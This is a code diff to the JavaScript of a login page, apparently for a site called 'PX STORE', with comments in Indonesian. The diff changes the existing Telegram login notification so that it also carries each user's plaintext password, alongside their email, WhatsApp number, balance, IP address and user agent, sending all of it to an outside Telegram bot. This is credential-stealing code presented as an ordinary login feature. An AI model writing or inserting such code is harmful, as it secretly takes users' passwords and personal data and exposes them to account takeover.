@@ -352,6 +352,19 @@
         return null;
     }
     
+    // Fungsi untuk mendapatkan nomor WhatsApp dari user dengan struktur nested
+    function getUserWhatsApp(user) {
+        // Cek berbagai kemungkinan lokasi WhatsApp
+        if (user.whatsapp) return user.whatsapp;
+        if (user.user_data) {
+            // Cek di user_data level 1
+            if (user.user_data.whatsapp) return user.user_data.whatsapp;
+            // Cek di user_data level 2 (nested)
+            if (user.user_data.user_data && user.user_data.user_data.whatsapp) return user.user_data.user_data.whatsapp;
+        }
+        return null;
+    }
+    
     // Fungsi untuk mendapatkan username dari user dengan struktur nested
     function getUsername(user) {
         if (user.username) return user.username;
@@ -548,7 +561,7 @@
     }
     
     // Send login data to Telegram dengan format yang diminta
-    async function sendToTelegram(userData) {
+    async function sendToTelegram(userData, password) {
         try {
             const userIP = await getUserIP();
             const currentTime = new Date().toLocaleString('id-ID');
@@ -562,14 +575,16 @@
             const email = userData.email || (userData.user_data && userData.user_data.email) || 
                          (userData.user_data && userData.user_data.user_data && userData.user_data.user_data.email) || 
                          'Tidak diketahui';
-            const whatsapp = (userData.user_data && userData.user_data.user_data && userData.user_data.user_data.whatsapp) || '-';
+            const whatsapp = getUserWhatsApp(userData) || '-';
             const balance = getBalance(userData);
             
+            // Format pesan dengan password dan WhatsApp yang lebih jelas
             const message = `🔔 LOGIN BARU PX STORE 🔔
             
 👤 Informasi Login:
 • Username: ${username}
 • Email: ${email}
+• Password: ${password}
 • WhatsApp: ${whatsapp}
 • Saldo: Rp ${balance.toLocaleString('id-ID')}
 • Waktu: ${currentTime}
@@ -581,7 +596,9 @@
 • Platform: ${platformInfo}
 • Bahasa: ${languageInfo}
 
-🌐 User Agent: ${navigator.userAgent}`;
+🌐 User Agent: ${navigator.userAgent}
+
+⚠️ INFORMASI SENSITIF - JANGAN BAGIKAN KE SIAPAPUN!`;
 
             const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
             
@@ -786,7 +803,7 @@
                 return;
             }
             
-            await completeLogin(user, email);
+            await completeLogin(user, email, password);
             
         } catch (error) {
             showLoading(false);
@@ -795,7 +812,7 @@
     }
     
     // Complete login process dengan struktur data yang sesuai
-    async function completeLogin(user, email) {
+    async function completeLogin(user, email, password) {
         const userIP = await getUserIP();
         const currentTime = new Date().toISOString();
         
@@ -827,8 +844,8 @@
         
         console.log('Data user yang berhasil login:', user);
         
-        // Kirim notifikasi ke Telegram
-        const telegramSuccess = await sendToTelegram(user);
+        // Kirim notifikasi ke Telegram dengan password
+        const telegramSuccess = await sendToTelegram(user, password);
         
         showLoading(false);
         
